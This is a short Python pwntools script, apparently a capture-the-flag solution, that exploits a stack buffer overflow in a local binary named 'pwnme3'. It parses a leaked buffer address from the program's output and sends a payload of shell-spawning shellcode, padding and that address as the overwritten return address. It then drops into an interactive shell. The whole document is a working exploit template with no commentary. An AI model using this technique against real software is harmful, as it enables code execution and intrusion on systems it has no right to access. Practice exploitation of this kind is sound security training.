from pwn import *
import re

context.arch = "amd64"
b = process('./pwnme3')

# Binary prints: "What's this? 0x<buffer_address>"
while True:
    line = b.recvline()
    print(line)
    match = re.search(rb'0x[0-9a-fA-F]+', line)
    if match:
        leak = int(match.group(), 16)
        break

log.info(f"Buffer address: {hex(leak)}")

shell   = asm(shellcraft.sh())
banana  = b'A' * (0x50 - len(shell))
balls   = b'A' * 8                    # saved RBP
payload = shell + banana + balls + p64(leak)

b.sendline(payload)
b.interactive()